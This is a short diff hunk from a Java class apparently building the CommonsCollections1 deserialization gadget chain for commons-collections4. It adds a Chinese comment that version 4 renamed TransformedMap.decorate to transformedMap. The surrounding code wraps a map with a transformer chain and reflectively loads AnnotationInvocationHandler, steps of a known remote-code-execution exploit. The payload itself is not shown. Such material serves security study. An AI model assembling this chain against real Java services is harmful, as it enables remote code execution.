@@ -32,6 +32,7 @@ public class CommonsCollections1For4 {
         Transformer transformerChain = new ChainedTransformer(transformers);
         Map innerMap = new HashMap();
         innerMap.put("value", "xxxx");
+        // ccv4把cc中的TransformedMap.decorate改成了TransformedMap.transformedMap
         Map outerMap = TransformedMap.transformedMap(innerMap, null, transformerChain);
 
         Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
